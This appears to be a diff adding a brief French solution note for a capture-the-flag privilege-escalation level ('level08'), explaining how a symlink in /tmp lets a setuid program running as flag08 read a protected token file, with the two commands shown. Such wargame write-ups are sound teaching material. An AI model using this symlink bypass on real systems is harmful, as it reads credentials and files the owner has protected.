@@ -1,0 +1,8 @@
+on a un programme level08 et un fichier token
+le programme level08 echo le contenu d'un fichier et s'exécute en tant que flag08
+
+si on fait un lien symbolique du fichier token sur un fichier dans tmp et qu'on exécute 
+le programme sur ce fichier on peut lire le fichier token
+ln -s /home/user/level08/token /tmp/fichierlien
+
+./level08 /tmp/fichierlien
